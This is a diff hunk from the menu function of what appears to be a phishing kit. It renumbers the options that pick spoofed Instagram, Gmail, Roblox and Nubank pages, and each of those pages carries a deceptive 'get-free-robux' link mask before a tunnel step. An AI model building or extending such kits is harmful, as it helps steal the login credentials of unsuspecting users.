@@ -553,11 +553,11 @@ main_menu() {
 			site_instagram;;
 		3 | 03)
 			site_gmail;;
-		35)
+		4 | 04)
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
-		36)
+		5 | 05)
 			website="nubank"
 			mask='https://get-free-robux'
 			tunnel_menu;;
